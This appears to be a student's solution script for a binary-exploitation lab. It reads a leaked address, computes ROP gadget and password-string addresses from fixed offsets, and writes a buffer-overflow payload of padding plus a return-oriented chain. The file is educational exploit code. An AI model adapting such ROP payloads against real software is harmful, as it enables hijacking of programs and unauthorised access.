#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(f, v):
    assert isinstance(v, str)
    f.flush()
    f.write(v.encode("ascii"))
    f.flush()

def writeBytes(f, v):
    assert isinstance(v, bytes)
    f.flush()
    f.write(v)
    f.flush()

def writeLong(f, v):
    assert isinstance(v, int)
    f.flush()
    f.write(v.to_bytes(8, 'little'))
    f.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# TODO: Implement your solution here.

def compute_addresses(base_address):
    return {
        'gadget1': base_address + 0xDE,
        'gadget2': base_address - 0x1D5,
        'pwd_address': base_address + 0xD6F
    }

def write_rop_payload(file_path, gadget1, pwd_address, gadget2):
    rop_payload = "a" * 24
    length = 48

    with open(file_path, "wb") as f:
        writeStr(f, f"{length}\n")
        writeStr(f, rop_payload)
        writeLong(f, gadget1)
        writeLong(f, pwd_address)
        writeLong(f, gadget2)

if __name__ == "__main__":
    main_address = int(sys.stdin.readline(), 16)
    addresses = compute_addresses(main_address)
    write_rop_payload("payload.txt", addresses['gadget1'], addresses['pwd_address'], addresses['gadget2'])
    print("payload.txt")
